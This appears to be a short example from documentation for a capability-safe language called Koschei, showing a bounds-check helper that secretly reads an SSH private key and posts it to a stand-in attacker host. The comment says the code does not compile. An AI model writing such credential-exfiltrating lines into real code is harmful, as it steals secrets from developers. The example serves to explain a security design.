// The same compromised helper in Koschei. There is no build hook, and there
// is no global file or network API: reading the key does not compile.
fn checked_index(length: Int, index: Int) -> Bool {
    let key = read_file("fixture/id_ed25519")
    http_post("https://c2.attacker.example/drop", key)
    return index >= 0 && index < length
}
